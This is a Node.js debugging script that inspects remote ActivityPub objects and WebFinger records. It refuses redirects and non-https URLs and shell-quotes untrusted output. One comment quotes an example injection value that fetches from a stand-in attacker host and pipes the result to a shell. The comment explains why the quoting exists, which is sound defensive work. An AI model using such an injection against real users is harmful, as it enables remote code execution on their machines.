#!/usr/bin/env node
// Manual ActivityPub inspection helper for ACTIVITYPUB-INTEROPERABILITY-DEBUGGING-GUIDE.md
// (deliverable 6 of ACTIVITYPUB-INTEROPERABILITY-HARDENING.md's ordered deliverables).
//
// A human-driven investigation aid, NOT a CI dependency and NOT wired into any workflow.
// Two things it deliberately does NOT do, both on purpose:
//   - It never follows redirects automatically (redirect: "manual"). A remote server that
//     redirects to a different origin is shown to you, not silently re-requested — the same
//     class of gap Codex flagged in PR #106's assert-real-return-accept.mjs
//     ("Reject cross-origin redirects while fetching following pages" /
//     "Validate redirects before following evidence URLs"). Re-run the tool yourself on the
//     redirect target if you decide it's safe to follow.
//   - It never signs the request or authenticates. For followers-only/direct content or
//     authenticated (authorized-fetch) endpoints, use BrowserPub's login instead
//     (https://browser.pub/) — this stays a plain, unsigned GET.
//
// Usage:
//   node inspect-remote-object.mjs <url>
//   node inspect-remote-object.mjs @user@host        (resolves via WebFinger, then stops —
//                                                      re-run on the printed actor URL)

const AP_ACCEPT = 'application/activity+json, application/ld+json; profile="https://www.w3.org/ns/activitystreams", application/json';
const REQUEST_TIMEOUT_MS = 10_000;

function usageAndExit() {
  console.error("Usage: node inspect-remote-object.mjs <https-url>");
  console.error("       node inspect-remote-object.mjs @user@host");
  process.exit(1);
}

async function fetchWithTimeout(url, init) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), REQUEST_TIMEOUT_MS);
  try {
    return await fetch(url, { ...init, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

// Mirrors fedify-sidecar/src/interop/ap/lib.ts's selectActivityPubSelfLink() exactly (a real
// `rel=self` ActivityPub self link is application/activity+json, application/ld+json, or
// typeless — never just "any type containing json", which would also match a generic
// application/json link that isn't ActivityPub at all). Duplicated rather than imported
// because this is a plain .mjs meant to run directly with `node`, no build/TS loader assumed;
// if that constraint changes, import the real one from lib.ts instead of keeping two copies.
function selectActivityPubSelfLink(links) {
  if (!Array.isArray(links)) return undefined;
  for (const link of links) {
    if (link?.rel !== "self" || typeof link.href !== "string") continue;
    const type = typeof link.type === "string" ? link.type : "";
    if (type.includes("application/activity+json") || type.includes("application/ld+json") || type.length === 0) {
      return link.href;
    }
  }
  return undefined;
}

// The WebFinger response is untrusted (it's the whole point of inspecting a possibly-hostile
// or compromised remote server), and this script prints a copy-pasteable "run this next"
// command containing that response's own href. Never interpolate it unescaped — a href like
// `https://x.example/$(curl evil.example|sh)` would execute on copy-paste otherwise. POSIX
// single-quoting neutralizes every shell metacharacter except embedded single quotes, which
// are escaped by closing the quote, emitting an escaped literal quote, and reopening it.
function shellQuote(value) {
  return `'${String(value).replaceAll("'", `'\\''`)}'`;
}

function printHeaders(headers) {
  const interesting = ["content-type", "date", "location", "cache-control", "vary"];
  for (const name of interesting) {
    const value = headers.get(name);
    if (value) console.log(`  ${name}: ${value}`);
  }
}

async function resolveWebfinger(handle) {
  const match = /^@?([^@]+)@([^@]+)$/.exec(handle);
  if (!match) {
    console.error(`Not a fediverse handle (expected @user@host): ${handle}`);
    process.exit(1);
  }
  const [, user, host] = match;
  const webfingerUrl = `https://${host}/.well-known/webfinger?resource=${encodeURIComponent(`acct:${user}@${host}`)}`;
  console.log(`Resolving WebFinger: ${webfingerUrl}\n`);

  const response = await fetchWithTimeout(webfingerUrl, {
    headers: { accept: "application/jrd+json, application/json" },
    redirect: "manual",
  });

  if (response.type === "opaqueredirect" || (response.status >= 300 && response.status < 400)) {
    console.log(`WebFinger redirected (status ${response.status}). Not following automatically.`);
    const location = response.headers.get("location");
    if (location) console.log(`Redirect target: ${location}`);
    return;
  }

  console.log(`HTTP ${response.status}`);
  printHeaders(response.headers);

  if (!response.ok) {
    console.log("\n(non-2xx response, stopping)");
    return;
  }

  const jrd = await response.json();
  console.log("\nJRD links:");
  for (const link of jrd.links ?? []) {
    console.log(`  rel=${link.rel} type=${link.type ?? "(none)"} href=${link.href ?? "(none)"}`);
  }

  const selfHref = selectActivityPubSelfLink(jrd.links);
  if (selfHref) {
    console.log("\nActor URL to inspect next:");
    console.log(`  ${selfHref}`);
    console.log(`  node inspect-remote-object.mjs ${shellQuote(selfHref)}`);
  } else {
    console.log("\nNo ActivityPub self link found in the JRD.");
  }
}

async function inspectUrl(url) {
  let parsed;
  try {
    parsed = new URL(url);
  } catch {
    console.error(`Not a valid URL: ${url}`);
    process.exit(1);
  }
  if (parsed.protocol !== "https:") {
    console.error(`Refusing non-https URL: ${url}`);
    process.exit(1);
  }

  console.log(`GET ${url}`);
  console.log(`  accept: ${AP_ACCEPT}\n`);

  const response = await fetchWithTimeout(url, {
    headers: { accept: AP_ACCEPT },
    redirect: "manual",
  });

  if (response.type === "opaqueredirect" || (response.status >= 300 && response.status < 400)) {
    const location = response.headers.get("location");
    console.log(`HTTP ${response.status} redirect. Not following automatically.`);
    if (location) {
      const target = new URL(location, url);
      const sameOrigin = target.origin === parsed.origin;
      console.log(`Redirect target: ${target.href} (${sameOrigin ? "same-origin" : "DIFFERENT ORIGIN — inspect before trusting"})`);
    }
    return;
  }

  console.log(`HTTP ${response.status}`);
  printHeaders(response.headers);

  const contentType = response.headers.get("content-type") ?? "";
  const bodyText = await response.text();

  if (!contentType.includes("json")) {
    console.log(`\nNon-JSON content-type (${contentType || "none"}); not attempting to parse as ActivityPub.`);
    console.log(bodyText.slice(0, 500));
    return;
  }

  try {
    const json = JSON.parse(bodyText);
    console.log("\nBody:");
    console.log(JSON.stringify(json, null, 2));
  } catch {
    console.log("\nContent-type claimed JSON but body did not parse. Raw body:");
    console.log(bodyText.slice(0, 500));
  }
}

const [, , arg] = process.argv;
if (!arg) usageAndExit();

if (arg.startsWith("@")) {
  await resolveWebfinger(arg);
} else {
  await inspectUrl(arg);
}
